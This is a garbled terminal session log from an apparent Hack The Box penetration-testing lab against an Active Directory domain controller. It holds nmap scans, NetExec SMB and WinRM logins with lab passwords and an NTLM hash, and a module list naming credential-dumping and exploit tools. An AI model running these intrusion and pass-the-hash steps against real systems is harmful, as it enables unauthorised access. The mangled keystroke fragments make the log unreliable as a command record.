-vvv-oN   nmap -p- --min-rate=3000 -vvv-oN nmap -p- --min-rate=3000 -vvv-oN   nmap -p- --min-rate=3000 -vvv-oN nmap -p- --min-rate=3000 -vvv-oN    nmap -p- --min-rate=3000 -vvv-oN nmap -p- --min-rate=3000 -vvv-oN    nmap -p- --min-rate=3000 -vvv-oN nmap -p- --min-rate=3000 -vvv-oN   nmap -p- --min-rate=3000 -vvv-oN nmap -p- --min-rate=3000 -vvv-oN nmap -p- --min-rate=3000 -vvv-oN nmap -p- --min-rate=3000 -vvv-oN    nmap -p- --min-rate=3000 -vvv-oN nmap -p- --min-rate=3000 -vvv-oN     nmap -p- --min-rate=3000 -vvv-oN nmap -p- --min-rate=3000 -vvv-oN nmap -p- --min-rate=3000 -vvv-oN nmap -p- --min-rate=3000 -vvv-oN       
+[2026-01-28 18:02:15] [pane=%0] [CMD_START] nmap -p- --min-rate=3000 -vvv 10.129.232.75 -oN puppyNmapOpenPorts.txt
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 18:02 -0500
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Initiating Ping Scan at 18:02
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Scanning 10.129.232.75 [4 ports]
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Completed Ping Scan at 18:02, 0.04s elapsed (1 total hosts)
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Initiating Parallel DNS resolution of 1 host. at 18:02
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Completed Parallel DNS resolution of 1 host. at 18:02, 0.50s elapsed
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Initiating SYN Stealth Scan at 18:02
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Scanning 10.129.232.75 [65535 ports]
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Discovered open port 445/tcp on 10.129.232.75
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Discovered open port 53/tcp on 10.129.232.75
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Discovered open port 111/tcp on 10.129.232.75
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Discovered open port 139/tcp on 10.129.232.75
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] Discovered open port 135/tcp on 10.129.232.75
+[2026-01-28 18:02:18] [w=0:tmux] [p=%0] [OUT] Discovered open port 2049/tcp on 10.129.232.75
+[2026-01-28 18:02:20] [w=0:tmux] [p=%0] [OUT] Discovered open port 464/tcp on 10.129.232.75
+[2026-01-28 18:02:22] [w=0:tmux] [p=%0] [OUT] Discovered open port 3269/tcp on 10.129.232.75
+[2026-01-28 18:02:24] [w=0:tmux] [p=%0] [OUT] Discovered open port 61839/tcp on 10.129.232.75
+[2026-01-28 18:02:25] [w=0:tmux] [p=%0] [OUT] Discovered open port 49669/tcp on 10.129.232.75
+[2026-01-28 18:02:26] [w=0:tmux] [p=%0] [OUT] Discovered open port 636/tcp on 10.129.232.75
+[2026-01-28 18:02:28] [w=0:tmux] [p=%0] [OUT] Discovered open port 49667/tcp on 10.129.232.75
+[2026-01-28 18:02:35] [w=0:tmux] [p=%0] [OUT] Discovered open port 49694/tcp on 10.129.232.75
+[2026-01-28 18:02:39] [w=0:tmux] [p=%0] [OUT] Discovered open port 60715/tcp on 10.129.232.75
+[2026-01-28 18:02:44] [w=0:tmux] [p=%0] [OUT] Discovered open port 49676/tcp on 10.129.232.75
+[2026-01-28 18:02:52] [w=0:tmux] [p=%0] [OUT] Discovered open port 3260/tcp on 10.129.232.75
+[2026-01-28 18:02:54] [w=0:tmux] [p=%0] [OUT] Discovered open port 3268/tcp on 10.129.232.75
+[2026-01-28 18:02:56] [w=0:tmux] [p=%0] [OUT] Discovered open port 49664/tcp on 10.129.232.75
+[2026-01-28 18:02:57] [w=0:tmux] [p=%0] [OUT] Discovered open port 389/tcp on 10.129.232.75
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] Completed SYN Stealth Scan at 18:02, 43.81s elapsed (65535 total ports)
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] Nmap scan report for 10.129.232.75
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] Host is up, received echo-reply ttl 127 (0.031s latency).
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] Scanned at 2026-01-28 18:02:15 EST for 44s
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] Not shown: 65516 filtered tcp ports (no-response)
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] PORT      STATE SERVICE          REASON
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 53/tcp    open  domain           syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 111/tcp   open  rpcbind          syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 135/tcp   open  msrpc            syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 139/tcp   open  netbios-ssn      syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 389/tcp   open  ldap             syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 445/tcp   open  microsoft-ds     syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 464/tcp   open  kpasswd5         syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 636/tcp   open  ldapssl          syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 2049/tcp  open  nfs              syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 3260/tcp  open  iscsi            syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 49664/tcp open  unknown          syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 49667/tcp open  unknown          syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 49669/tcp open  unknown          syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 49676/tcp open  unknown          syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 49694/tcp open  unknown          syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 60715/tcp open  unknown          syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] 61839/tcp open  unknown          syn-ack ttl 127
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] Read data files from: /usr/share/nmap
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] Nmap done: 1 IP address (1 host up) scanned in 44.44 seconds
+[2026-01-28 18:02:59] [w=0:tmux] [p=%0] [OUT] Raw packets sent: 131081 (5.768MB) | Rcvd: 43 (1.876KB)
+[2026-01-28 18:03:32] [w=0:tmux] [p=%0] [OUT] -Pn -oNnmap -p$ports -sSCV --min-rate=2000
+[2026-01-28 18:03:32] [w=0:tmux] [p=%0] [OUT] -Pn -oNnmap -p$ports -sSCV --min-rate=2000
+[2026-01-28 18:03:33] [w=0:tmux] [p=%0] [OUT] -Pn -oNnmap -p$ports -sSCV --min-rate=2000
+[2026-01-28 18:03:33] [w=0:tmux] [p=%0] [OUT] -Pn -oNnmap -p$ports -sSCV --min-rate=2000
+[2026-01-28 18:03:55] [w=0:tmux] [p=%0] [OUT] -Pn -oN    
+[2026-01-28 18:03:55] [pane=%0] [CMD_START] nmap -p$ports -sSCV --min-rate=2000 -Pn -oN puppyNmapServicesVersions.txt 10.129.232.75 
+[2026-01-28 18:03:55] [w=0:tmux] [p=%0] [OUT] Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 18:03 -0500
+[2026-01-28 11:06:39] [w=0:tmux] [p=%0] [OUT] -Pn -oN puppyNmapServicesVersions.txt
+[2026-01-28 11:06:39] [pane=%0] [CMD_START] nmap -p$ports -sSCV --min-rate=2000 -Pn -oN puppyNmapServicesVersions.txt 10.129.232.75 
+[2026-01-28 11:06:39] [w=0:tmux] [p=%0] [OUT] Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 11:06 -0500
+[2026-01-28 11:07:22] [w=0:tmux] [p=%0] [OUT] Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+[2026-01-28 11:07:22] [w=0:tmux] [p=%0] [OUT] Service scan Timing: About 71.43% done; ETC: 11:07 (0:00:17 remaining)
+[2026-01-28 11:07:24] [w=0:tmux] [p=%0] [OUT] Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+[2026-01-28 11:07:24] [w=0:tmux] [p=%0] [OUT] Service scan Timing: About 71.43% done; ETC: 11:07 (0:00:18 remaining)
+[2026-01-28 11:08:46] [w=0:tmux] [p=%0] [OUT] Stats: 0:02:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+[2026-01-28 11:08:46] [w=0:tmux] [p=%0] [OUT] NSE Timing: About 99.97% done; ETC: 11:08 (0:00:00 remaining)
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] Nmap scan report for 10.129.232.75
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] Host is up (0.031s latency).
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] Bug in iscsi-info: no string output.
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] PORT      STATE SERVICE       VERSION
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 53/tcp    open  domain        Simple DNS Plus
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-28 23:06:50Z)
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 111/tcp   open  rpcbind       2-4 (RPC #100000)
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] | rpcinfo:
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   program version    port/proto  service
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100000  2,3,4        111/tcp   rpcbind
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100000  2,3,4        111/tcp6  rpcbind
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100000  2,3,4        111/udp   rpcbind
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100000  2,3,4        111/udp6  rpcbind
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100003  2,3         2049/udp   nfs
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100003  2,3         2049/udp6  nfs
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100005  1,2,3       2049/udp   mountd
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100005  1,2,3       2049/udp6  mountd
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100021  1,2,3,4     2049/tcp   nlockmgr
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100021  1,2,3,4     2049/tcp6  nlockmgr
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100021  1,2,3,4     2049/udp   nlockmgr
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100021  1,2,3,4     2049/udp6  nlockmgr
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100024  1           2049/tcp   status
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100024  1           2049/tcp6  status
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   100024  1           2049/udp   status
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |_  100024  1           2049/udp6  status
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 135/tcp   open  msrpc         Microsoft Windows RPC
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB, Site: Default-First-Site-Name)
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 445/tcp   open  microsoft-ds?
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 464/tcp   open  kpasswd5?
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 636/tcp   open  tcpwrapped
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 2049/tcp  open  nlockmgr      1-4 (RPC #100021)
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 3260/tcp  open  iscsi?
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB, Site: Default-First-Site-Name)
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 3269/tcp  open  tcpwrapped
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |_http-title: Not Found
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |_http-server-header: Microsoft-HTTPAPI/2.0
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 9389/tcp  open  mc-nmf        .NET Message Framing
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 49664/tcp open  msrpc         Microsoft Windows RPC
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 49669/tcp open  msrpc         Microsoft Windows RPC
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 49694/tcp open  msrpc         Microsoft Windows RPC
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] 61839/tcp open  msrpc         Microsoft Windows RPC
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] Host script results:
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] | smb2-security-mode:
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   3.1.1:
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |_    Message signing enabled and required
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |_clock-skew: 7h00m02s
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] | smb2-time:
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |   date: 2026-01-28T23:08:37
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] |_  start_date: N/A
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[2026-01-28 11:09:32] [w=0:tmux] [p=%0] [OUT] Nmap done: 1 IP address (1 host up) scanned in 173.43 seconds
+[2026-01-28 11:11:56] [w=0:tmux] [p=%0] [OUT] nxc smb DC01.certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'nxcnxcc c smb
+[2026-01-28 11:11:56] [w=0:tmux] [p=%0] [OUT] DC01.certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
+[2026-01-28 11:11:56] [w=0:tmux] [p=%0] [OUT] b DC01.certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
+[2026-01-28 11:11:56] [w=0:tmux] [p=%0] [OUT] mb DC01.certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
+[2026-01-28 11:11:56] [w=0:tmux] [p=%0] [OUT] smb DC01.certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
+[2026-01-28 11:11:56] [w=0:tmux] [p=%0] [OUT] smb DC01.certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'nx
+[2026-01-28 11:11:57] [w=0:tmux] [p=%0] [OUT] nxc smb DC01.certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'n
+[2026-01-28 11:11:57] [w=0:tmux] [p=%0] [OUT] nnmap -p$ports -sSCV --min-rate=2000 -Pn -oN puppyNmapServicesVersions.txt 10.129.232.75 
+[2026-01-28 11:12:04] [w=0:tmux] [p=%0] [OUT] sssudo vim /etc/hostssususudsuddosudoo o vvviviimm m ///eettcc//hhoosstts
+[2026-01-28 11:12:04] [pane=%0] [CMD_START] sudo vim /etc/hosts
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] [sudo] password for b7h30:
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] Authorization required, but no authorization protocol specified
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] "/etc/hosts" 20L, 705B▽  zz0%m           >c127.0.0.1localhost
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 127.0.1.1       kali# The following lines are desirable for IPv6 capable hosts
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] ::1     localhost ip6-localhost ip6-loopback
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] ff02::1 ip6-allnodes
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] ff02::2 ip6-allrouters
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 10.10.10.161 htb.local FOREST.htb.local
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 10.10.11.35   CICADA-DC cicada.htb CICADA-DC.cicada.htb
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 104.21.48.215 ctf.rsl.host
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 10.10.10.100    active.htb
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 10.10.10.175    sauna.htb egotistical-bank.local sauna.egotistical-bank.local
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 10.10.11.187    flight.htb school.flight.htb
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 192.168.113.97  secura.yzx dc1.secura.yzx
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 10.10.11.108    return.htb
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 10.10.10.192 blackfield.local
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 10.10.11.42 administrator.htb
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 10.129.232.128 sequel.htb DC01.sequel.htb
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 10.129.71.156 frizzdc.frizz.htb frizz.htb
+[2026-01-28 11:12:07] [w=0:tmux] [p=%0] [OUT] 10.129.231.186  DC01.certified.htb certified.htb
+[2026-01-28 11:13:42] [w=0:tmux] [p=%0] [OUT] ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            20,14All~@@   47-48i -- INSERT --20,47-48      All8-491,1    1203.4152697.82931021.27354545-17p6-18u7-19p8-20p9-21y20-22.1-23h2-24t3-25b4-26^[  21,23-25      All::wq
+[2026-01-28 11:13:42] [w=0:tmux] [p=%0] [OUT] "/etc/hosts" 21L, 729B written
+[2026-01-28 11:18:46] [w=0:tmux] [p=%0] [OUT] nxc smb DC01.certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'nxcnxcc c smb 1
+[2026-01-28 11:18:52] [w=0:tmux] [p=%0] [OUT] 0.129.232.168 -u f.frizzle -p 'Jenni_Luvs_Magic23' -d frizz.htb0.129.232.7
+[2026-01-28 11:18:59] [w=0:tmux] [p=%0] [OUT] 5 ---uu u levi.jh ames
+[2026-01-28 11:19:00] [w=0:tmux] [p=%0] [OUT] -
+[2026-01-28 11:19:00] [w=0:tmux] [p=%0] [OUT] -
+[2026-01-28 11:19:01] [w=0:tmux] [p=%0] [OUT] -p
+[2026-01-28 11:19:16] [w=0:tmux] [p=%0] [OUT] -p '''KingofAkron2025!!'' ' -----sshhaarrees
+[2026-01-28 11:19:16] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' --shares
+[2026-01-28 11:19:18] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
+[2026-01-28 11:19:20] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
+[2026-01-28 11:19:22] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               [*] Enumerated shares
+[2026-01-28 11:19:22] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               Share           Permissions     Remark
+[2026-01-28 11:19:22] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               -----           -----------     ------
+[2026-01-28 11:19:22] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
+[2026-01-28 11:19:22] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               C$                              Default share
+[2026-01-28 11:19:22] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
+[2026-01-28 11:19:22] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
+[2026-01-28 11:19:22] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share
+[2026-01-28 11:19:22] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share
+[2026-01-28 11:19:35] [w=0:tmux] [p=%0] [OUT] inrm 10.129.232.168 -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htbe
+[2026-01-28 11:19:46] [w=0:tmux] [p=%0] [OUT] inf    inrm 10.129.232.168 -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htbi fnfrrrimiz z10.129.232.7
+[2026-01-28 11:19:53] [w=0:tmux] [p=%0] [OUT] 5 ---uu u levi.jame
+[2026-01-28 11:19:55] [w=0:tmux] [p=%0] [OUT] s
+[2026-01-28 11:20:08] [w=0:tmux] [p=%0] [OUT] s ---uu u -  ---pp p '''KingofAkron2025!!'
+[2026-01-28 11:20:08] [pane=%0] [CMD_START] nxc winrm 10.129.232.75 -u levi.james -p 'KingofAkron2025!'
+[2026-01-28 11:20:11] [w=0:tmux] [p=%0] [OUT] WINRM       10.129.232.75   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
+[2026-01-28 11:20:11] [w=0:tmux] [p=%0] [OUT] WINRM       10.129.232.75   5985   DC               [-] PUPPY.HTB\levi.james:KingofAkron2025!
+[2026-01-28 11:23:25] [pane=%0] [CMD_START] showmount -e 10.129.232.75
+[2026-01-28 11:25:39] [w=0:tmux] [p=%0] [OUT] Export list for 10.129.232.75:
+[2026-01-28 12:02:37] [w=0:tmux] [p=%0] [OUT] mb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' --sharesm-sbsh h-u
+[2026-01-28 12:03:08] [w=0:tmux] [p=%0] [OUT] -p 'KingofAkron2025!' --sharese sr  esa   resh    aress     hares-      shares-       -shares         --shares =         --shares --M      10.129.232.75  levi.james -p  -M 10.129.232.75  levi.james -p  -M  sshhaarrees10.129.232.75  levi.james -p   shares 10.129.232.75  levi.james -p   shares  ---o10.129.232.75  levi.james -p   shares -o 10.129.232.75  levi.james -p   shares -o  SSHHAARREE==DDEEVV--SSHHAARRE10.129.232.75  levi.james -p   shares  SHARE=DEV-SHARE 10.129.232.75  levi.james -p   shares  SHARE=DEV-SHARE  ffoor10.129.232.75  levi.james -p   shares  SHARE=DEV-SHARE for 10.129.232.75  levi.james -p   shares  SHARE=DEV-SHARE for  PPUUPPPPYY--DDEEVVSnxc-u
+[2026-01-28 12:03:08] [w=0:tmux] [p=%0] [OUT] -p 'KingofAkron2025!' -M-onxc-u
+[2026-01-28 12:03:13] [w=0:tmux] [p=%0] [OUT] -p 'KingofAkron2025!' -M-o'DEV-SHARE for PUPPY-DEVS'DEV-SHARE for PUPPY-DEVSS'
+[2026-01-28 12:03:13] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' -M shares -o SHARE='DEV-SHARE for PUPPY-DEVS'
+[2026-01-28 12:03:13] [w=0:tmux] [p=%0] [OUT] usage: nxc [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L [LIST_MODULES]]
+[2026-01-28 12:03:13] [w=0:tmux] [p=%0] [OUT] [--options]
+[2026-01-28 12:03:13] [w=0:tmux] [p=%0] [OUT] nxc: error: argument -M/--module: invalid choice: 'shares' (choose from adcs, add-computer, aws-credentials, backup_operator, badsuccessor, bitlocker, certipy-find, change-password, coerce_plus, daclread, dfscoerce, dns-nonsecure, dpapi_hash, drop-library-ms, drop-sc, dump-computers, efsr_spray, empire_exec, enable_cmdshell, entra-id, enum_av, enum_ca, enum_dns, enum_impersonate, enum_interfaces, enum_links, enum_logins, enum_trusts, eventlog_creds, exec_on_link, find-computer, firefox, get-desc-users, get-info-users, get-network, get-unixUserPassword, get-userPassword, get_netconnections, gpp_autologin, gpp_password, gpp_privileges, group-mem, groupmembership, handlekatz, hash_spider, hyperv-host, iis, impersonate, install_elevated, ioxidresolver, keepass_discover, keepass_trigger, laps, ldap-checker, link_enable_cmdshell, link_xpcmd, lockscreendoors, lsassy, maq, masky, met_inject, mobaxterm, mremoteng, ms17-010, msol, mssql_coerce, mssql_priv, nanodump, nopac, notepad, notepad++, ntds-dump-raw, ntdsutil, ntlm_reflection, ntlmv1, obsolete, petitpotam, pi, powershell_history, pre2k, presence, printerbug, printnightmare, procdump, pso, putty, raisechild, rdcman, rdp, recent_files, recyclebin, reg-query, reg-winlogon, remote-uac, remove-mic, runasppl, sccm, sccm-recon6, schtask_as, scuffy, security-questions, shadowcoerce, shadowrdp, slinky, smbghost, snipped, spider_plus, spooler, subnets, teams_localdb, test_connection, timeroast, uac, user-desc, veeam, vnc, wam, wcc, wdigest, web_delivery, webdav, whoami, wifi, winscp, zerologon)
+[2026-01-28 12:24:56] [w=0:tmux] [p=%0] [OUT] -p 'KingofAkron2025!' -M-o'DEV-SHARE for PUPPY-DEVS'nxc-u
+[2026-01-28 12:24:56] [w=0:tmux] [p=%0] [OUT] -p 'KingofAkron2025!' -M-o'DEV-SHARE for PUPPY-DEVS'nxc-u
+[2026-01-28 12:24:56] [w=0:tmux] [p=%0] [OUT] -p 'KingofAkron2025!' -M-o'DEV-SHARE for PUPPY-DEVS'nxc-u
+[2026-01-28 12:24:56] [w=0:tmux] [p=%0] [OUT] -p 'KingofAkron2025!' -M-o'DEV-SHARE for PUPPY-DEVS'nxc-u
+[2026-01-28 12:24:56] [w=0:tmux] [p=%0] [OUT] -p 'KingofAkron2025!' -M-o'DEV-SHARE for PUPPY-DEVS'nxc-u
+[2026-01-28 12:24:57] [w=0:tmux] [p=%0] [OUT] -p 'KingofAkron2025!' -M-o'DEV-SHARE for PUPPY-DEVS'nxc-u
+[2026-01-28 12:25:01] [w=0:tmux] [p=%0] [OUT] -p 'KingofAkron2025!' -M-o'DEV-SHARE for PUPPY-DEVS'       - 
+[2026-01-28 12:25:01] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' -o SHARE='DEV-SHARE for PUPPY-DEVS'
+[2026-01-28 12:25:03] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
+[2026-01-28 12:25:03] [w=0:tmux] [p=%0] [OUT] SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
